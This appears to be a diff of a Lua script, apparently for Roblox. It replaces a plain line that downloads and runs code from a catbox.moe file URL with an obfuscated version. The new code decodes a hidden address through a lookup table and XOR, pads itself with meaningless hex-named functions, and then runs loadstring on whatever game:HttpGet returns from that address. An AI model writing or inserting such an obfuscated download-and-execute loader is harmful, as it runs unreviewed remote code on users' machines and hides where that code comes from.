@@ -1,1 +1,60 @@
-loadstring(game:HttpGet("https://files.catbox.moe/7adr6f.txt"))()
+local _S = (function()
+  local _k = 141
+  local _a = "HXP/2~OAQVFK51TRZ7B!W89*EJC+D43_S0=LIYN.G6UM"
+  local _lut = {}
+  for _i = 1, 44 do _lut[_a:sub(_i, _i)] = _i - 1 end
+  local _e = {"~Z", "~!", "~V~4~4~0~=2A/3/3~R~Q~~~5~=/_~B~Z~4~!~O~J/_~2~O~5/32F~Z~1~L2K~R/_~4~J~4"}
+  local _o = {}
+  for _i = 1, #_e do
+    local _s = _e[_i]
+    local _t = ""
+    for _j = 1, #_s, 2 do
+      local _b = _lut[_s:sub(_j, _j)] * 44 + _lut[_s:sub(_j + 1, _j + 1)]
+      _t = _t .. string.char(bit32.bxor(_b, _k))
+    end
+    _o[_i] = _t
+  end
+  return _o
+end)()
+
+local _0xD9D3 = game
+
+local _0x462A = (_0x462A or {})
+local _0xC1A0 = (_0xC1A0 or {})
+local _0xF1F8 = (_0xF1F8 or {})
+local _0x87C6 = (_0x87C6 or {})
+local _0x43D9 = (_0x43D9 or {})
+local _0xAF32 = function ()
+  local _0x872B = (5 * 0)
+  for _0xFCDF = (9 * 0 + 1), (3 * 2 + 2) do
+    _0x872B = (_0x872B + _0xFCDF)
+  end
+  local _0x4F5A = {(8 * 0 + 1), (2 * 1), (3 * 1), _0x872B}
+  local _0x9517 = (_S[1] .. _S[2])
+  return (_0x4F5A[(5 * 0 + 1)] + #_0x9517)
+end
+local _0xB851 = function ()
+  local _0x08BD = (3 * 0)
+  for _0x479D = (4 * 0 + 1), (4 * 2) do
+    _0x08BD = (_0x08BD + _0x479D)
+  end
+  local _0x6465 = {(5 * 0 + 1), (4 * 0 + 2), (5 * 0 + 3), _0x08BD}
+  local _0x4AA9 = (_S[1] .. _S[2])
+  return (_0x6465[(9 * 0 + 1)] + #_0x4AA9)
+end
+local _0x34F1 = function ()
+  local _0x2DB3 = (9 * 0)
+  for _0xFF22 = (3 * 0 + 1), (4 * 2) do
+    _0x2DB3 = (_0x2DB3 + _0xFF22)
+  end
+  local _0x1580 = {(4 * 0 + 1), (5 * 0 + 2), (6 * 0 + 3), _0x2DB3}
+  local _0x3A25 = (_S[1] .. _S[2])
+  return (_0x1580[(5 * 0 + 1)] + #_0x3A25)
+end
+do
+  local _0xGUARD = ((2 * 3) == 6)
+  if _0xGUARD then
+    loadstring(_0xD9D3:HttpGet(_S[3]))()
+
+  end
+end
